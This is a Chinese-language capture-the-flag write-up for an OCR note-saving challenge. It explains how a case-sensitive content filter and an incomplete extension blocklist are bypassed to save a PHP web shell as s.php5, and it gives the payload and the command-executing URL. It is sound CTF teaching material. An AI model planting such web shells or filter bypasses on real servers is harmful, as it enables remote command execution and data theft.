# OCR

## 題目描述

An exposed **OCR** note saver. Draw, recognize, save — and see what a note can become.

## 解題思路

進去題目是一個 OCR 筆記工具，POST 一張 PNG 的 data URL 給後端，後端用 Tesseract 把圖片的文字辨識出來，再把辨識結果存到 `saved/<filename>`

因為 cookie 是 `PHPSESSID` 所以可以推斷後面是 php，然後圖片的檔名又可以隨便取，所以應該是要傳 php webshell 進去

當然題目沒那個簡單，有一些 filter

1. 副檔名黑名單:擋掉 `{php, phtml, phar, inc}`，但漏了 `.php5`，而這個 Apache 仍然會把 `.php5` 當 PHP 執行（`.pht/.php3/.php7` 之類只能存不能跑）

2. 內容過濾：擋 `<?php`、`<?=`、`system`、`eval`、`passthru`、`<script` 等等，但它大小寫敏感，所以用 `<?PHP SYSTEM($_GET[0]);?>` 可以直接繞過

所以做一張圖片是 `<?PHP SYSTEM($_GET[0]);?>`，存成 `s.php5`，然後去 `/saved/s.php5?0=cat /flag` 即可得到 flag

## Flag

```text
LYKNCTF{ffacbff49cdb4845998be081de2a7beb} (dynamic flag)
```
